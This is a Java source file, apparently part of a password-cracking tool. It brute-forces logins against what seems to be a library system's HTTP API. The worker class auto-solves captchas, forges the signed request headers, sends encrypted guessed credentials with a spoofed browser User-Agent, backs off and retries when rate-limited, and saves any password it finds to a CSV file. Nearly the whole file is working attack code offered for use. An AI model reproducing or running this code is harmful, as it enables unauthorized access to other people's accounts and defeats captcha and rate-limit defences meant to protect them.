package com.userzbb.cracker;

import org.apache.hc.client5.http.classic.methods.HttpGet;
import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
import org.apache.hc.client5.http.impl.classic.CloseableHttpResponse;
import org.apache.hc.client5.http.impl.classic.HttpClients;
import org.apache.hc.client5.http.impl.io.PoolingHttpClientConnectionManager;
import org.apache.hc.client5.http.config.RequestConfig;
import org.apache.hc.core5.http.io.entity.EntityUtils;
import org.apache.hc.core5.util.Timeout;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.time.LocalDateTime;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Worker thread for checking login credentials against the HTTP API.
 * Matches src/core/worker.py from UJN_lib_scaper.
 */
public class HttpWorker implements Runnable {
    private final String username;
    private final String password;
    private final ProgressTracker progressTracker;
    private final DatabaseManager dbManager;
    private final AtomicInteger successCount;

    private static final PoolingHttpClientConnectionManager CONNECTION_POOL =
        new PoolingHttpClientConnectionManager();

    private static final CloseableHttpClient HTTP_CLIENT;

    // Static executor reference for immediate shutdown when password found
    private static volatile ExecutorService staticExecutor;

    private static final int MAX_RETRIES = 15;
    private static final long BASE_BACKOFF_MS = 1000;
    private static final long MAX_BACKOFF_MS = 20000;
    private static final int REQUEST_TIMEOUT_SECONDS = 8;

    static {
        CONNECTION_POOL.setMaxTotal(100);
        CONNECTION_POOL.setDefaultMaxPerRoute(20);
        RequestConfig requestConfig = RequestConfig.custom()
            .setConnectionRequestTimeout(Timeout.ofSeconds(REQUEST_TIMEOUT_SECONDS))
            .setResponseTimeout(Timeout.ofSeconds(REQUEST_TIMEOUT_SECONDS))
            .build();
        HTTP_CLIENT = HttpClients.custom()
            .setConnectionManager(CONNECTION_POOL)
            .setDefaultRequestConfig(requestConfig)
            .build();
    }

    public static void setExecutor(ExecutorService executor) {
        staticExecutor = executor;
    }

    private static void shutdownNow() {
        ExecutorService exec = staticExecutor;
        if (exec != null) {
            exec.shutdownNow();
        }
    }

    public enum LoginResult {
        SUCCESS,
        FAIL_PASS,
        FAIL_CAPTCHA,
        FAIL_LOCK,
        FAIL_RATE_LIMIT,
        ERROR
    }

    public HttpWorker(String username, String password, ProgressTracker progressTracker,
                     DatabaseManager dbManager, AtomicInteger successCount) {
        this.username = username;
        this.password = password;
        this.progressTracker = progressTracker;
        this.dbManager = dbManager;
        this.successCount = successCount;
    }

    @Override
    public void run() {
        try {
            LoginResult result = checkLogin();
            dbManager.queueProgress(username, password, result.name());
            progressTracker.updateIfHigher(password);
            progressTracker.incrementAttempts();

            if (result == LoginResult.SUCCESS) {
                successCount.incrementAndGet();
                dbManager.recordFoundPassword(username, password);
                System.out.println("\n[+] SUCCESS! Password found: " + password);
                progressTracker.stop();
                // Don't call shutdownNow() - let workers finish naturally to avoid ONNX crash

                // Immediately save to CSV file
                saveToCsv(username, password);
            } else if (result == LoginResult.FAIL_CAPTCHA) {
                // Don't print for every failure to avoid spam
            }
        } catch (Exception e) {
            System.err.println("Error checking password " + password + ": " + e.getMessage());
            dbManager.queueProgress(username, password, LoginResult.ERROR.name());
        }
    }

    /**
     * Saves found password to CSV file immediately.
     */
    private static synchronized void saveToCsv(String username, String password) {
        String csvPath = "found_passwords.csv";
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(csvPath))) {
            writer.write("username,password,found_at\n");
            writer.write(username + "," + password + "," + LocalDateTime.now() + "\n");
            System.out.println("[+] Results saved to: " + csvPath);
        } catch (Exception e) {
            System.err.println("Failed to save CSV: " + e.getMessage());
        }
    }

    /**
     * Attempts login with retries.
     * Matches Python check_login() function.
     */
    public LoginResult checkLogin() throws Exception {
        int retryCount = 0;
        int consecutiveNetErrors = 0;

        while (retryCount < MAX_RETRIES && progressTracker.isRunning()) {
            try {
                LoginResult result = attemptLogin();

                if (result == LoginResult.SUCCESS) {
                    return result;
                }
                if (result == LoginResult.FAIL_PASS || result == LoginResult.FAIL_LOCK) {
                    return result;
                }
                if (result == LoginResult.FAIL_CAPTCHA) {
                    retryCount++;
                    if (retryCount % 5 == 0) {
                        System.err.println("[Worker] Captcha failed " + retryCount + " times for " + password);
                    }
                    consecutiveNetErrors = 0;
                    Thread.sleep(200);
                    continue;
                }
                if (result == LoginResult.FAIL_RATE_LIMIT) {
                    retryCount++;
                    consecutiveNetErrors++;
                    long sleepTime = Math.min(5000 + consecutiveNetErrors * 2000, 30000);
                    Thread.sleep(sleepTime);
                    continue;
                }
                // ERROR - retry with backoff
                retryCount++;
                consecutiveNetErrors++;
                if (retryCount % 5 == 0) {
                    System.err.println("[Worker] Network error " + retryCount + " times for " + password);
                }
                long backoff = Math.min(1000 * (consecutiveNetErrors * 3 / 2), MAX_BACKOFF_MS);
                Thread.sleep(backoff);
                continue;

            } catch (InterruptedException e) {
                // Interrupt received - exit gracefully (this is normal during shutdown)
                return LoginResult.ERROR;
            } catch (Exception e) {
                // Check if interrupted during exception handling
                if (Thread.currentThread().isInterrupted()) {
                    return LoginResult.ERROR;
                }
                retryCount++;
                consecutiveNetErrors++;
                if (retryCount >= 5) {
                    System.err.println("[Worker] Exception " + retryCount + " times for " + password + ": " + e.getMessage());
                }
                long backoff = Math.min(1000 * (consecutiveNetErrors * 3 / 2), MAX_BACKOFF_MS);
                Thread.sleep(backoff);
            }
        }

        if (!progressTracker.isRunning()) {
            return LoginResult.ERROR;
        }

        System.err.println("[Worker] Gave up on " + password + " after " + MAX_RETRIES + " retries");
        return LoginResult.ERROR;
    }

    /**
     * Attempts a single login request.
     * Matches Python check_login() internal logic.
     */
    private LoginResult attemptLogin() throws Exception {
        // 1. Get Captcha
        CaptchaSolver.CaptchaResult captcha = CaptchaSolver.fetchAndSolve();
        if (captcha == null || captcha.captchaId == null || captcha.code == null) {
            return LoginResult.ERROR;
        }

        // 2. Prepare headers with encryption
        String[] headers = CryptoUtils.generateHeaders("GET");
        String encryptedUsername = CryptoUtils.encryptAES(username);
        String encryptedPassword = CryptoUtils.encryptAES(password);

        // 3. Build URL with query params
        String loginUrl = Config.LOGIN_API + "?captchaId=" + captcha.captchaId + "&answer=" + captcha.code;

        // 4. Send Login Request using shared client
        HttpGet request = new HttpGet(loginUrl);
        request.setHeader("x-request-id", headers[0]);
        request.setHeader("x-request-date", headers[1]);
        request.setHeader("x-hmac-request-key", headers[2]);
        request.setHeader("logintype", "PC");
        request.setHeader("username", encryptedUsername);
        request.setHeader("password", encryptedPassword);
        request.setHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
        request.setHeader("Accept", "application/json");

        try (CloseableHttpResponse response = HTTP_CLIENT.execute(request)) {
            int statusCode = response.getCode();
            String responseBody = EntityUtils.toString(response.getEntity());

            return parseLoginResponse(statusCode, responseBody);
        }
    }

    /**
     * Parses the login response.
     * Matches Python check_login() response parsing logic.
     */
    private LoginResult parseLoginResponse(int statusCode, String responseBody) {
        if (statusCode == 429) {
            return LoginResult.FAIL_RATE_LIMIT;
        }

        if (statusCode == 200) {
            // Parse JSON to get status and message
            String status = extractJsonValue(responseBody, "status");
            String message = extractJsonValue(responseBody, "message");
            boolean hasToken = responseBody.contains("\"token\"");

            // Success case
            if ("success".equals(status) || hasToken) {
                return LoginResult.SUCCESS;
            }

            // Failure cases based on message
            if (message != null) {
                if (message.contains("验证码")) {
                    return LoginResult.FAIL_CAPTCHA;
                }
                if (message.contains("密码") || message.contains("账号") || message.contains("非法")) {
                    return LoginResult.FAIL_PASS;
                }
                if (message.contains("锁定")) {
                    return LoginResult.FAIL_LOCK;
                }
                if (message.contains("频繁") || message.toLowerCase().contains("limit")) {
                    return LoginResult.FAIL_RATE_LIMIT;
                }
            }

            // Default to FAIL_PASS for unknown errors
            return LoginResult.FAIL_PASS;
        }

        return LoginResult.ERROR;
    }

    /**
     * Extracts a string value from simple JSON.
     */
    private String extractJsonValue(String json, String key) {
        Pattern pattern = Pattern.compile("\"" + key + "\"\\s*:\\s*\"([^\"]+)\"");
        Matcher matcher = pattern.matcher(json);
        if (matcher.find()) {
            return matcher.group(1);
        }
        return null;
    }
}
